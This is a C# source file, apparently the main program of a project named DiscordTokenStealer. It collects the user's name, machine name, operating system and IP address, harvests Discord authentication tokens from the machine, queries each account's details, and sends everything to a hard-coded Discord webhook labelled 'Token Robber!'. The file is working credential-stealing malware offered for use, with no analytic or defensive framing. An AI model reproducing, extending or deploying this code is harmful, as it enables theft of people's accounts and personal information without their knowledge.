using System.Text;
using DiscordTokenStealer;
using DiscordTokenStealer.Discord;

StringBuilder content = new StringBuilder()
    .AppendLine($"Username: {Environment.UserName}")
    .AppendLine($"Machine Name: {Environment.MachineName}")
    .AppendLine($"Operating System: {Environment.OSVersion.Platform} ({(Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit")})")
    .AppendLine($"IP-Address: {await IpInfo.GetIPAddress()}")
    .AppendLine("Tokens: ");
await Parallel.ForEachAsync(TokenParser.Parse(), async (token, cts) => await AppendUserSummary(token, cts));
using DiscordWebhook webhook = new DiscordWebhook("913528883410771989", "bpci971IJ8tSAvn0iPqiJ2HioRhy5RD_6syK-Avg4iqTTQa7pGMvxLMvOXNIyvxEJi3C");
await webhook.SendMessage(new DiscordMessage(content.ToString(), "Token Robber!", "https://cdn.discordapp.com/emojis/889939729099943967.png?size=256"));

async Task AppendUserSummary(string token, CancellationToken cts)
{
    DiscordClient client = new DiscordClient(token);
    string? summary = await client.GetUserSummary(cts);
    lock (content)
    {
        content.Append(summary);
    }
}